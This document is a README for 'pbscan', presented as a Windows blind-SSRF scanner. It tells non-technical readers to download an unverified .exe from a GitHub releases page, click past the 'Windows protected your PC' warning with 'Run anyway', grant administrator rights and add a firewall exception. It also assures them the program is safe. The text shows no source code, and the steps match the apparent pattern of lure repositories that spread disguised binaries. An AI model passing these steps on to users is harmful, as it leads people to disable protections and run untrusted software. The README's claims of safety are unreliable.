# 🔍 pbscan - Find hidden website security vulnerabilities fast

[![](https://img.shields.io/badge/Download_pbscan-Blue?style=for-the-badge&logo=github)](https://github.com/cobaltbluereservoir537/pbscan/releases)

## What is pbscan?

pbscan finds security holes called blind SSRF. These holes allow attackers to talk to internal systems that stay hidden from the public internet. This tool does the work for you by testing websites. It tracks every request to show you exactly where the system fails. It works with the PingBack service to confirm that a connection happened outside the normal path. You get a clear report on which parts of an application are open to attack.

## 💻 System Requirements

Your computer needs a few things to run pbscan:

*   Windows 10 or Windows 11.
*   64-bit hardware architecture.
*   At least 4GB of RAM.
*   An active internet connection to send and receive scan traffic.
*   Administrator rights to allow the tool to open network ports.

## 📥 How to Download 

Follow these steps to get the tool on your machine:

1.  Visit the official release page: https://github.com/cobaltbluereservoir537/pbscan/releases.
2.  Look at the latest release section at the top of the page.
3.  Click the file ending in `.exe` to start the download.
4.  Save the file to your desktop or a folder you can find easily.

[![](https://img.shields.io/badge/Download_Link-Grey?style=for-the-badge)](https://github.com/cobaltbluereservoir537/pbscan/releases)

## ⚡ Setting Up the Program

Windows might show a warning because it does not recognize the file yet. This is normal for security tools. 

1.  Find the `pbscan.exe` file you downloaded.
2.  Right-click the file and select "Open" or double-click it. 
3.  If a window appears saying "Windows protected your PC," click "More info."
4.  Click the "Run anyway" button.
5.  A command prompt window will open. This is where the program lives.

## 🛠️ How to Perform a Scan

pbscan runs through the command line. You do not need to be a coder to use it. Follow these steps to test a website:

1.  Open your Start menu and type `cmd`. Press Enter to open the terminal.
2.  Type `cd Desktop` and press Enter to move to your desktop.
3.  Type `pbscan.exe` followed by a space and the website address you want to scan.
4.  Example: `pbscan.exe -u https://example-website.com`
5.  Press Enter to start.

The program will now talk to the website. It sends small data packets to see how the server responds. 

## 📊 Understanding Your Results

The program prints information directly to your screen. You will see several types of messages:

*   Status updates: The tool tells you which path it checks currently.
*   Payload injection: This means the tool tried to send a special command to see if the server reacts.
*   Correlation logs: These messages link your scan to the PingBack server. If you see a notification here, the server successfully reached out to the tracker.
*   Summary: After the scan finishes, you see a list of URLs that allowed the connection. 

If a URL shows as "Vulnerable," you found a hidden entry point. You should report this to the owner of the website. 

## 🧪 Best Practices

Keep these tips in mind to get the best results from your scans:

*   Scan one website at a time to keep your internet connection stable.
*   Ensure you have permission to test the website. Scanning websites you do not own can violate terms of service or local laws. Use this tool only on platforms that invite security testing, like bug bounty programs.
*   Run the scan from a stable network. Wi-Fi drops can cause the tool to miss callbacks.
*   Check your firewall settings if you receive zero results. Sometimes Windows blocks the feedback signals required for blind SSRF detection. You may need to create an exception for the pbscan program in your Windows Security settings.

## 📝 Frequently Asked Questions

**Does this tool install files on my system?**
No. It runs as a standalone file. You can delete the .exe file when you finish your work.

**What should I do if the window closes immediately?**
This usually means a required component is missing or Windows blocked the execution. Ensure you have the latest Windows updates installed.

**Where does the data go?**
The tool sends requests to the website you specify and the PingBack servers. It does not send your personal information to other locations.

**Can I save the results?**
You can print the command output to a file. Add ` > results.txt` to the end of your command when you run it. For example: `pbscan.exe -u https://example.com > results.txt`. This creates a file on your desktop with all the findings inside.

**Is it safe to run?**
Yes. The tool makes requests to websites. It does not perform destructive actions on your own machine. Use caution during use to avoid unintended network load on the sites you test.